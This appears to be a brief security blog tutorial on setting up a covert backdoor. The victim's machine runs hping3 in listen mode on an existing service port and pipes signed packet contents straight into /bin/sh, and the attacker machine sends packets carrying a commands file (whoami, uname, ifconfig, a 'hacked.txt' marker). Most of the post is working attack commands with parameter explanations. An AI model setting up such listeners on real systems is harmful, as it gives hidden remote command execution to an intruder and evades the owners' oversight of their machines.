---
title:  "Hidden Command Listener"
---

![Logo](/assets/images/backdoor.jpg)

## Create a hidden command listener by reusing an open port

### Scenario:
* **Box A** - Victim, running a network service on port 8834. We'll reuse this port!
* **Box B** - Attacker host behind NAT. Will transmit commands to the listener waiting on the victim.

This is similar to a reverse shell from box A to box B, except that B will need another way to view results of the commands executed on A:

**A (Victim's box)**:
```bash
$ sudo hping3 --listen SecretSignature -I vboxnet0 -p 8834 | /bin/sh
```

Explanation for the parameters:
```
--listen  - Listen mode. Waits for packets containing the signature and dump the data from signature to the end of the packet 
-I        - Interface to listen on
-p        - Listening port
```

This will intercept packets and dump the content after a matching signature. Commands will be passed to the shell to be executed. Another trick would be needed to view the output of the commands though.

**B (Attacker's box**: 
```bash
$ sudo hping3 --count 1 --data 200 --file commands.txt --sign SecretSignature 192.168.56.1 -V -p 8834
```

Explanation for the parameters:
```
--count 1   - Stop after sending 1 packet
--data 200  - Set packet body size in bytes
--file      - Fill packet with data from file
--sign      - Fill first a signature in the packet
-V          - Verbose mode
-p          - Destination port
```

The content of the commands file:
```bash
$ cat commands.txt
echo 123 > hacked.txt
whoami > log.txt
uname -a >> log.txt
pwd >> log.txt
ls -al >> log.txt
ifconfig -a >> log.txt

```

**Note**: The new line at the end is important to get the last command executed !

The commands should have been executed on victim's machine (A) and results saved in the corresponding log file.
